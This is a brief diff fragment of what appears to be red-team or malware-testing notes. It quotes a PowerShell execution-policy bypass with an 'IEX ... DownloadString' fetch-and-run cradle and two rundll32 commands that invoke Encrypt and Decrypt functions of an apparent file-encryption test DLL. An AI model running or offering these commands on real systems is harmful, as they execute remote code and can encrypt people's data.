@@ -63,9 +63,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 
 
 EncryptDelTestv4.1.dll
-
 rundll32.exe EncryptDelTestv4.1.dll,Encrypt
-
 rundll32.exe EncryptDelTestv4.1.dll,Decrypt
 
 
